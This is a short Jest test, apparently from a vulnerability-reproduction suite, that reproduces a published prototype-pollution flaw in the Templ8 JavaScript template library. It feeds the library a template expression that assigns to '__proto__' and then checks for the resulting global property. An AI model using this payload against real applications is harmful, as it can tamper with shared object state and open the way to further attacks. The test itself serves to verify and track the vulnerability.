//https://snyk.io/vuln/SNYK-JS-TEMPL8-598770
test("prototype pollution in Templ8", () => {
  expect({}.polluted).toBe(undefined);

  const Templ8 = require("Templ8");
  const tpl = new Templ8('{{__proto__.polluted="yes"}}');
  tpl.parse();

  try {
    expect(polluted).toBe("yes");
  } catch {
    expect(false).toBe(true);
  }
});
